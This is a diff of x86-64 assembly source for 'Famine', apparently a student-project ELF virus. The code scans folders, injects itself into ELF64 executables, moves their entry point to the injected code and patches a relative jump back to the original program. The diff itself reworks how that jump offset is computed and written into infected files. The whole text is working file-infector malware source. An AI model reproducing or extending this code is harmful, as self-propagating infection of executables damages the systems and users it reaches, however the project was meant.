@@ -100,17 +100,6 @@ _start:
 	lea rdi, [rel infected_folder_2]		; treate_folder(infected_folder_2);
 	call treate_folder				; ...
 
-	; test if jmp_value is not defined
-	mov rax, [jmp_value]				; if (jmp_value != 0)
-	cmp rax, 0					; 	goto _jmp;
-	jne _jmp					; ...
-
-.end:
-	mov rax, SYS_EXIT				; exit(
-	mov rdi, 0					; 0
-	syscall						; );
-
-_jmp:
 	; restore all registers
 	pop r11
 	pop r10
@@ -122,8 +111,13 @@ _jmp:
 	pop rsi
 	pop rdi
 	pop rax
-_jmp_instr
-	jmp [jmp_value]					; jmp jmp_value => default behavior of infected file
+_jmp_instr:
+	db 0xe9, 00, 00, 00, 00				; jump to default behavior of infected file
+							; or to next instruction if original virus
+
+	mov rax, SYS_EXIT				; exit(
+	mov rdi, 0					; 0
+	syscall						; );
 
 ; void treate_folder(char const *_folder);
 ; void treate_folder(rdi folder);
@@ -550,7 +544,7 @@ inject:
 	%local exec_segment:qword			; elf64_phdr *exec_segment;
 	%local old_entry:qword				; long old_entry;
 	%local new_entry:qword				; long new_entry;
-	%local computed_jmp_value:qword			; long computed_jmp_value;
+	%local computed_jmp_value:dword			; int computed_jmp_value;
 
 	; Initializes stack frame
 	push rbp
@@ -594,19 +588,19 @@ inject:
 
 	; compute jmp_value
 							; code_length_to_jmp = _jmp_instr - _start + 5 (5 is the size of the jmp instruction)
-	mov rdi, [old_entry]				; computed_jmp_value = old_entry - (new_entry + code_length_to_jmp);
-	sub rdi, [new_entry]				; ...
-	add rdi, _jmp_instr - _start			; ...
-	add rdi, 5					; ...
-	mov [computed_jmp_value], rdi			; ...
+	mov edi, [old_entry]				; computed_jmp_value = old_entry - (new_entry + code_length_to_jmp);
+	sub edi, [new_entry]				; ...
+	sub edi, _jmp_instr - _start			; ...
+	sub edi, 5					; ...
+	mov [computed_jmp_value], edi			; ...
 
 	; change jmp_value in injected code
 	mov rdi, [file_map]				; jmp_value_ptr = file_map + new_entry + (_end - _start) - 8 (8 is the size of the jmp_value variable);
 	add rdi, [new_entry]				; ...
-	add rdi, _end - _start				; ...
-	sub rdi, 8					; ...
-	mov rsi, [computed_jmp_value]			; *jmp_value_ptr = computed_jmp_value;
-	mov [rdi], rsi					; ...
+	add rdi, _jmp_instr - _start			; ...
+	inc rdi						; ...
+	mov esi, [computed_jmp_value]			; *jmp_value_ptr = computed_jmp_value;
+	mov [rdi], esi					; ...
 
 	jmp .end					; goto end
 
@@ -657,6 +651,5 @@ section .data
 	len_elf_64_magic: equ $ - elf_64_magic
 	signature: db "Famine v1.0 by jmaia and dhubleur"
 	len_signature: equ $ - signature
-	jmp_value: dq 0x0000000000000000
 
 _end:
